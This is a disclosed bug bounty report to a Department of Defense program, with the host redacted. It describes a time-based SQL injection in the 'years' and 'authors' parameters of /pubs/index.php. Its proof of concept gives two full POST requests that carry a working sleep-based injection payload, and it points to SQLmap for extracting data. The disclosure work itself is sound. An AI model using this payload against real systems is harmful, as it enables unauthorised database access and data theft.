# Time based SQL injection at████████

## Report Details
- **Report ID**: 2312334
- **URL**: https://hackerone.com/reports/2312334
- **State**: Closed
- **Severity**: high
- **Submitted**: 2024-01-11T14:48:29.230Z
- **Disclosed**: 2024-01-26T18:56:56.156Z

## Reporter
- **Username**: aziz0x48
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: deptofdefense

## Vulnerability Information
**Description:**

While doing test on██████, I’ve found that the endpoint at /pubs/index.php is vulnerable with SQL injection vulnerability.
Vulnerable parameters are 'years' and 'authors'

## References
Please check screenshots attached.

## Impact

Time based SQL injection can lead to the exfiltration of sensitive data from the database.

## System Host(s)
███████

## Affected Product(s) and Version(s)


## CVE Numbers


## Steps to Reproduce
## POC

Make the following POST request to /pubs/index.php

```
POST /pubs/index.php HTTP/1.1
Host:██████
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 68
Origin: https://███████
Referer: https://███████/pubs/index.php
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Te: trailers
Connection: close

years=2017&authors=Hurlburt'XOR(if(now()=sysdate(),sleep(2*2),0))OR'
```

Notice that the response time will be 4 seconds.


```
POST /pubs/index.php HTTP/1.1
Host:█████████
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 68
Origin: https://████████
Referer: https://████/pubs/index.php
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Te: trailers
Connection: close

years=2017&authors=Hurlburt'XOR(if(now()=sysdate(),sleep(5*5),0))OR'
```

Notice that the response time will be 25 seconds.

This can be further exploited manually or using automated tools such as SQLmap to get data from the DB, but I will stop here for this report.

Thanks.

## Suggested Mitigation/Remediation Actions




## Attachments
No attachments
